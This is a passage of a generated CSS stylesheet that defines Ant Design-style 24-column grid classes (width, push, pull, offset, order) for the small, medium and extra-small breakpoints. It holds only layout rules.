      flex: 0 0 33.33333333333333%;
      max-width: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-8 {
      inset-inline-start: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-8 {
      inset-inline-end: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-8 {
      margin-inline-start: 33.33333333333333%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-8 {
      order: 8;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-7 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 29.166666666666668%;
      max-width: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-7 {
      inset-inline-start: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-7 {
      inset-inline-end: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-7 {
      margin-inline-start: 29.166666666666668%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-7 {
      order: 7;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-6 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 25%;
      max-width: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-6 {
      inset-inline-start: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-6 {
      inset-inline-end: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-6 {
      margin-inline-start: 25%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-6 {
      order: 6;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-5 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 20.833333333333336%;
      max-width: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-5 {
      inset-inline-start: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-5 {
      inset-inline-end: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-5 {
      margin-inline-start: 20.833333333333336%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-5 {
      order: 5;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-4 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 16.666666666666664%;
      max-width: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-4 {
      inset-inline-start: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-4 {
      inset-inline-end: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-4 {
      margin-inline-start: 16.666666666666664%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-4 {
      order: 4;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-3 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 12.5%;
      max-width: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-3 {
      inset-inline-start: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-3 {
      inset-inline-end: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-3 {
      margin-inline-start: 12.5%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-3 {
      order: 3;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-2 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 8.333333333333332%;
      max-width: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-2 {
      inset-inline-start: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-2 {
      inset-inline-end: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-2 {
      margin-inline-start: 8.333333333333332%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-2 {
      order: 2;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-1 {
      --ant-display: block;
      display: block;
      display: var(--ant-display);
      flex: 0 0 4.166666666666666%;
      max-width: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-1 {
      inset-inline-start: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-1 {
      inset-inline-end: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-1 {
      margin-inline-start: 4.166666666666666%;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-1 {
      order: 1;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-0 {
      display: none;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
      inset-inline-start: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
      inset-inline-end: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-push-0 {
      inset-inline-start: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-pull-0 {
      inset-inline-end: auto;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-offset-0 {
      margin-inline-start: 0;
    }

    :where(.css-dev-only-do-not-override-pr0fja).ant-col-xs-order-0 {
      order: 0;
    }

    @media (min-width: 576px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-24 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 100%;
        max-width: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-24 {
        inset-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-24 {
        inset-inline-end: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-24 {
        margin-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-24 {
        order: 24;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-23 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 95.83333333333334%;
        max-width: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-23 {
        inset-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-23 {
        inset-inline-end: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-23 {
        margin-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-23 {
        order: 23;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-22 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 91.66666666666666%;
        max-width: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-22 {
        inset-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-22 {
        inset-inline-end: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-22 {
        margin-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-22 {
        order: 22;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-21 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 87.5%;
        max-width: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-21 {
        inset-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-21 {
        inset-inline-end: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-21 {
        margin-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-21 {
        order: 21;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-20 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 83.33333333333334%;
        max-width: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-20 {
        inset-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-20 {
        inset-inline-end: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-20 {
        margin-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-20 {
        order: 20;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-19 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 79.16666666666666%;
        max-width: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-19 {
        inset-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-19 {
        inset-inline-end: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-19 {
        margin-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-19 {
        order: 19;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-18 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 75%;
        max-width: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-18 {
        inset-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-18 {
        inset-inline-end: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-18 {
        margin-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-18 {
        order: 18;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-17 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 70.83333333333334%;
        max-width: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-17 {
        inset-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-17 {
        inset-inline-end: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-17 {
        margin-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-17 {
        order: 17;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-16 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 66.66666666666666%;
        max-width: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-16 {
        inset-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-16 {
        inset-inline-end: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-16 {
        margin-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-16 {
        order: 16;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-15 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 62.5%;
        max-width: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-15 {
        inset-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-15 {
        inset-inline-end: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-15 {
        margin-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-15 {
        order: 15;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-14 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 58.333333333333336%;
        max-width: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-14 {
        inset-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-14 {
        inset-inline-end: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-14 {
        margin-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-14 {
        order: 14;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-13 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 54.166666666666664%;
        max-width: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-13 {
        inset-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-13 {
        inset-inline-end: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-13 {
        margin-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-13 {
        order: 13;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-12 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 50%;
        max-width: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-12 {
        inset-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-12 {
        inset-inline-end: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-12 {
        margin-inline-start: 50%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-12 {
        order: 12;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-11 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 45.83333333333333%;
        max-width: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-11 {
        inset-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-11 {
        inset-inline-end: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-11 {
        margin-inline-start: 45.83333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-11 {
        order: 11;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-10 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 41.66666666666667%;
        max-width: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-10 {
        inset-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-10 {
        inset-inline-end: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-10 {
        margin-inline-start: 41.66666666666667%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-10 {
        order: 10;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-9 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 37.5%;
        max-width: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-9 {
        inset-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-9 {
        inset-inline-end: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-9 {
        margin-inline-start: 37.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-9 {
        order: 9;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-8 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 33.33333333333333%;
        max-width: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-8 {
        inset-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-8 {
        inset-inline-end: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-8 {
        margin-inline-start: 33.33333333333333%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-8 {
        order: 8;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-7 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 29.166666666666668%;
        max-width: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-7 {
        inset-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-7 {
        inset-inline-end: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-7 {
        margin-inline-start: 29.166666666666668%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-7 {
        order: 7;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-6 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 25%;
        max-width: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-6 {
        inset-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-6 {
        inset-inline-end: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-6 {
        margin-inline-start: 25%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-6 {
        order: 6;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-5 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 20.833333333333336%;
        max-width: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-5 {
        inset-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-5 {
        inset-inline-end: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-5 {
        margin-inline-start: 20.833333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-5 {
        order: 5;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-4 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 16.666666666666664%;
        max-width: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-4 {
        inset-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-4 {
        inset-inline-end: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-4 {
        margin-inline-start: 16.666666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-4 {
        order: 4;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-3 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 12.5%;
        max-width: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-3 {
        inset-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-3 {
        inset-inline-end: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-3 {
        margin-inline-start: 12.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-3 {
        order: 3;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-2 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 8.333333333333332%;
        max-width: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-2 {
        inset-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-2 {
        inset-inline-end: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-2 {
        margin-inline-start: 8.333333333333332%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-2 {
        order: 2;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-1 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 4.166666666666666%;
        max-width: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-1 {
        inset-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-1 {
        inset-inline-end: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-1 {
        margin-inline-start: 4.166666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-1 {
        order: 1;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-0 {
        display: none;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-push-0 {
        inset-inline-start: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-pull-0 {
        inset-inline-end: auto;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-offset-0 {
        margin-inline-start: 0;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-sm-order-0 {
        order: 0;
      }
    }

    @media (min-width: 768px) {
      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-24 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 100%;
        max-width: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-24 {
        inset-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-24 {
        inset-inline-end: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-24 {
        margin-inline-start: 100%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-24 {
        order: 24;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-23 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 95.83333333333334%;
        max-width: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-23 {
        inset-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-23 {
        inset-inline-end: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-23 {
        margin-inline-start: 95.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-23 {
        order: 23;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-22 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 91.66666666666666%;
        max-width: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-22 {
        inset-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-22 {
        inset-inline-end: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-22 {
        margin-inline-start: 91.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-22 {
        order: 22;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-21 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 87.5%;
        max-width: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-21 {
        inset-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-21 {
        inset-inline-end: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-21 {
        margin-inline-start: 87.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-21 {
        order: 21;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-20 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 83.33333333333334%;
        max-width: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-20 {
        inset-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-20 {
        inset-inline-end: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-20 {
        margin-inline-start: 83.33333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-20 {
        order: 20;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-19 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 79.16666666666666%;
        max-width: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-19 {
        inset-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-19 {
        inset-inline-end: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-19 {
        margin-inline-start: 79.16666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-19 {
        order: 19;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-18 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 75%;
        max-width: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-18 {
        inset-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-18 {
        inset-inline-end: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-18 {
        margin-inline-start: 75%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-18 {
        order: 18;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-17 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 70.83333333333334%;
        max-width: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-17 {
        inset-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-17 {
        inset-inline-end: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-17 {
        margin-inline-start: 70.83333333333334%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-17 {
        order: 17;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-16 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 66.66666666666666%;
        max-width: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-16 {
        inset-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-16 {
        inset-inline-end: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-16 {
        margin-inline-start: 66.66666666666666%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-16 {
        order: 16;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-15 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 62.5%;
        max-width: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-15 {
        inset-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-15 {
        inset-inline-end: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-15 {
        margin-inline-start: 62.5%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-15 {
        order: 15;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-14 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 58.333333333333336%;
        max-width: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-14 {
        inset-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-14 {
        inset-inline-end: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-14 {
        margin-inline-start: 58.333333333333336%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-order-14 {
        order: 14;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-13 {
        --ant-display: block;
        display: block;
        display: var(--ant-display);
        flex: 0 0 54.166666666666664%;
        max-width: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-push-13 {
        inset-inline-start: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-pull-13 {
        inset-inline-end: 54.166666666666664%;
      }

      :where(.css-dev-only-do-not-override-pr0fja).ant-col-md-offset-13 {
        margin-inline-start: 54.166666666666664%;
      }

